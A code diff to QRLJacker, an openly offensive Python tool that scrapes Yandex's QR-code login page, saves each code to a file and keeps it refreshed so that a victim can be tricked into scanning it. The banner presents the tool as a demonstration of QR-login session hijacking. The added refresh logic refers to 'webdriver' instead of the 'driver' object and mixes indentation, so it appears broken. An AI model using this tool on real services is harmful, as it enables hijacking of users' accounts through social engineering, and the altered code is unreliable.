@@ -125,7 +125,6 @@ def Yandex():
 	driver.get("https://passport.yandex.com/auth?mode=qr")
 	time.sleep(5)
 	while True:
-
 		try:
 			img_url = "https://passport.yandex.com" + driver.find_element_by_class_name("qr-code__i").get_attribute("style").split("\"")[1].encode("utf-8")
 			print " [*] QR code image detected !"
@@ -133,9 +132,12 @@ def Yandex():
 			print " [*] Downloading the image.."
 			f = open("tmp.svg","w").write(data)
 			print " [*] Saved To tmp.svg"
-			time.sleep(10)
-			print " [*] Refreshing page..."
-			driver.refresh()
+			time.sleep(20)
+			if "yandex.com" in webdriver.current_url.encode("utf-8"):
+			    if "mode=qr" not in webdriver.current_url.encode("utf-8"):
+                    print " [*] Refreshing page..."
+    			    driver.get("https://passport.yandex.com/auth?mode=qr")
+                    time.sleep(5)
 			continue
 		except:
 			break
@@ -655,6 +657,7 @@ def main():
  | |  | |  _  /| |    _   | |/ _` |/ __| |/ / _ \ '__|
  | |__| | | \ \| |___| |__| | (_| | (__|   <  __/ |
   \___\_\_|  \_\______\____/ \__,_|\___|_|\_\___|_|
+
   #QRLJacker is a customizable framework to demonstrate "QRLJacking Attack Vector" and shows How easy to hijack services that relies on QR Code Authentication!
   #A Social Engineering Attack Vector by: Mohamed A. Baset (@SymbianSyMoh)
   #Coded by: Karim Shoair (@D4Vinci)
